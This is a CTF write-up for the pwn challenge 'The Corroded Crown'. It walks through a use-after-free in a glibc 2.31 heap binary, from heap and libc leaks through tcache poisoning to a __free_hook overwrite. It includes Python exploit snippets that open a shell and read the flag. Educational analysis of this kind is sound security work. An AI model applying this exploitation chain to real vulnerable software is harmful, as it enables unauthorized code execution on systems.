# The Corroded Crown — Heap Exploitation (Tcache Poison + UAF)

**CTF:** Cyber Apocalypse 2026  
**Category:** PWN  
**Challenge:** The Corroded Crown  
**Flag:** `HTB{th3_cr0wn_h45_b33n_p01s0n3d_6d288fa904af2d01d7c36538a1923c3b}`

---

## Scenario

When the Signet shattered, Crownspire's oaths didn't die — they got imitated. Houses started turning out claims so immaculate they felt wrong in the hand, too perfect and too eager to be believed. The Corroded Crown was the old forge where the Signet's fragments were first shaped, a sanctified mechanism of authority now rusted and corrupted. Its relics still carry the old geometry, but the tolerances are off. Perfect face, wrong spine. Rin has found her way into the forge's service throat. The locks here are still called "sanctified," but she knows the tell by now. Someone has been refitting these holy mechanisms with new tolerances, quietly changing who gets let in once panic has everyone begging at the door. She isn't here to smash the system. She's here to make it accept the wrong truth.

**Target:** `154.57.164.78:31503`

---

## Analysis

### The Binary

The challenge provides a local copy of the binary (`corroded_crown`) with a custom glibc 2.31 (Ubuntu GLIBC 2.31-0ubuntu9.17).

```
$ file corroded_crown
corroded_crown: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV),
dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, not stripped
```

**Binary protections:**

| Protection | Status |
|------------|--------|
| RELRO | Full RELRO |
| Stack Canary | Found |
| NX | None — stack executable |
| PIE | Enabled |
| RWX Segments | Yes |

**Key function symbols:**

| Function | Address | Purpose |
|----------|---------|---------|
| `readline` | `0x10f0` | Reads input via `read(0, buf, size)` |
| `read_int` | `0x114f` | Reads a line, converts with `atoi` |
| `check_slot` | `0x11b3` | Finds first empty slot (scans active flags) |
| `forge_relic` | `0x121c` | `malloc(size)`, stores ptr + size in slot |
| `inscribe_relic` | `0x139d` | `read(0, ptr, size)` — writes user data into relic |
| `inspect_relic` | `0x14ba` | `write(1, ptr, size)` — reads relic contents |
| `destroy_relic` | `0x15b0` | `free(ptr)`, clears active flag |
| `print_banner` | `0x16b7` | Prints narrative banner |
| `main` | `0x180b` | Menu loop (1=Forge, 2=Inscribe, 3=Inspect, 4=Destroy) |

### Data Structure (BSS at `0x4040`)

Each relic slot is a 16-byte structure in a 64-entry array:

```
relic[i].ptr    = [0x4040 + i*16]   (8 bytes, pointer to malloc'd chunk)
relic[i].size   = [0x4048 + i*16]   (4 bytes, malloc'd size)
relic[i].active = [0x404c + i*16]   (1 byte, 1=occupied, 0=empty)
```

### The Vulnerabilities

#### 1. Use-After-Free (UAF) Read

`destroy_relic` calls `free(ptr)` and clears only the **active flag** — it never nullifies `ptr` or `size`. Meanwhile, `inspect_relic` reads `ptr` and `size` **without checking the active flag**, allowing us to read freed chunk metadata (tcache fd pointers, unsorted bin fd/bk).

```
destroy_relic:
  free(relic[idx].ptr)         ✓
  relic[idx].active = 0        ✓  ← only clears the flag
  // relic[idx].ptr = NULL     ✗  ← NOT cleared!
  // relic[idx].size = 0       ✗  ← NOT cleared!

inspect_relic:
  // if (!active) return;      ✗  ← NO check!
  write(1, relic[idx].ptr, relic[idx].size)  ← reads freed data
```

#### 2. Use-After-Free (UAF) Write

Similarly, `inscribe_relic` writes data into `relic[idx].ptr` without checking the active flag. This lets us overwrite freed chunk metadata, enabling **tcache poisoning**.

#### 3. Executable Stack

The binary has an executable stack (`GNU_STACK` missing), but since the attack uses `__free_hook`, this wasn't needed in our approach.

---

## How We Solved It — Reasoning

### Phase 1: Binary Reconnaissance

Connecting to the remote greeted us with a menu:

```
1. Forge     → malloc(size), store on shelf
2. Inscribe  → read(0, ptr, size) — write data into relic
3. Inspect   → write(1, ptr, size) — read relic data
4. Destroy   → free(ptr), mark shelf empty
```

The "forge" metaphor suggested a heap management challenge. Disassembly confirmed a relic shelf with 64 slots, each tracking a pointer, size, and active flag.

### Phase 2: Identifying the UAF

The `destroy` function's behavior was suspicious — the message "[!] The relic crumbles to ash. **The mark lingers.**" was a clear hint that the pointer survives the free. Verifying via `inspect` after `destroy` confirmed we could read freed chunk data (the tcache fd pointer was visible).

### Phase 3: Heap Leak

**Goal:** Learn the heap base address.

1. Forge relic A (slot 0, size 0x30)
2. Forge relic B (slot 1, size 0x30)
3. Destroy slot 1 → B goes to tcache[0x30]
4. Destroy slot 0 → A goes to tcache[0x30], A.fd = B's address
5. Inspect slot 0 → reads A's user data, which now contains the tcache next pointer = B's heap address

```
Heap leak: 0x558201daf2e0
```

### Phase 4: Libc Leak

**Goal:** Leak a libc address from the unsorted bin.

1. Forge relic C (slot 2, size 0x500) — large enough to go to unsorted bin
2. Forge relic D (slot 3, size 0x20) — guard chunk prevents top chunk consolidation
3. Destroy slot 2 → C goes to unsorted bin, `fd` and `bk` point to `main_arena + 0x60`
4. Inspect slot 2 → reads C's metadata, leaking `main_arena + 96`

```
Libc leak (unsorted fd): 0x7f0817530be0
Libc base: 0x7f0817344000
```

**Calculation:** For glibc 2.31:
- `main_arena` = `__malloc_hook + 0x10`
- Unsorted bin fd = `&main_arena.bins[0]` = `main_arena + 0x60`
- `libc_base = libc_leak - (__malloc_hook_offset + 0x70)`

### Phase 5: Tcache Poisoning

With glibc 2.31 (no safe-linking), tcache poisoning is straightforward:

1. **UAF Write:** Inscribe slot 0 (freed A) and overwrite its first 8 bytes (the tcache `next` pointer) with `__free_hook`'s address
2. **Consume:** `forge(4, 0x30)` → `malloc(0x30)` returns A (legitimate chunk)
3. **Redirect:** `forge(5, 0x30)` → `malloc(0x30)` returns `__free_hook`!

```python
inscribe(r, 0, p64(free_hook) + b'\x00' * 8 + b'A' * (0x30 - 16))
forge(r, 4, 0x30)   # returns legitimate chunk A
forge(r, 5, 0x30)   # returns __free_hook!
```

### Phase 6: Overwrite `__free_hook`

Now that slot 5's `ptr` points to `__free_hook`, inscribing it writes `system`'s address there:

```python
inscribe(r, 5, p64(system_addr).ljust(0x30, b'\x00'))
```

### Phase 7: Trigger Shell

1. Forge a new chunk with `/bin/sh\0` as its content
2. Destroy it → `free(chunk_ptr)` → `__free_hook(chunk_ptr)` → `system("/bin/sh")`

```python
forge(r, 6, 0x30)
inscribe(r, 6, b'/bin/sh\x00')
destroy(r, 6)  # -> system("/bin/sh")
```

### Verification

The shell opens immediately:

```
$ id
uid=100(ctf) gid=101(ctf) groups=101(ctf)
$ cat /home/ctf/flag.txt
HTB{th3_cr0wn_h45_b33n_p01s0n3d_6d288fa904af2d01d7c36538a1923c3b}
```

---

## Flag

```
HTB{th3_cr0wn_h45_b33n_p01s0n3d_6d288fa904af2d01d7c36538a1923c3b}
```

---

## Key Insights

1. **"The mark lingers" was the vulnerability hint** — the destroy function's message directly tells you the pointer is not erased, enabling UAF read/write.

2. **Full RELRO ≠ invulnerable** — Even with Full RELRO blocking GOT overwrite, `__free_hook` in glibc < 2.34 provides an alternative code execution primitive.

3. **Tcache poisoning in glibc 2.31 has no safe-linking** — Without the pointer mangling introduced in glibc 2.32, overwriting the tcache `next` pointer is trivial.

4. **No active flag check in inspect/inscribe** — The real bug was that only `forge` and `destroy` check the active flag. `inspect` and `inscribe` blindly trust the stored `ptr`, making UAF possible on any destroyed relic.

5. **Slot index = exploit control** — Since the user provides the slot index explicitly (not auto-assigned), we can freely mix allocated and freed slots for the exploit chain.

---

## Files

| File | Description |
|------|-------------|
| `corroded_crown` | Challenge binary |
| `glibc/libc.so.6` | Custom libc (Ubuntu GLIBC 2.31) |
| `glibc/ld-linux-x86-64.so.2` | Custom dynamic linker |
| `exploit.py` | Full exploit script |
